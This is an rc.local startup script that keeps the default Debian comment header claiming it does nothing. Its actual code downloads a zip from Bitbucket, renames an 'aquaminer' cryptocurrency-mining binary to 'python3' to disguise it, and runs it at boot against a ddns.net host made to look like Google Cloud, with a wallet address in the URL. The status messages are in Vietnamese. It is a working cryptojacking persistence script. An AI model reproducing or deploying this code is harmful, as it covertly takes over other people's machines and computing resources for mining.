#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/python3 ]; then
    if pgrep -x "python3" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
./python3 -F http://test-googlecloud.ddns.net/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh300i

     
fi
exit
fi

wget https://bitbucket.org/lovelyn/openai/downloads/data.zip
unzip data.zip
mv aquaminer-0.4-linux-amd64 python3
./python3 -F http://test-googlecloud.ddns.net/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh300i

exit 0
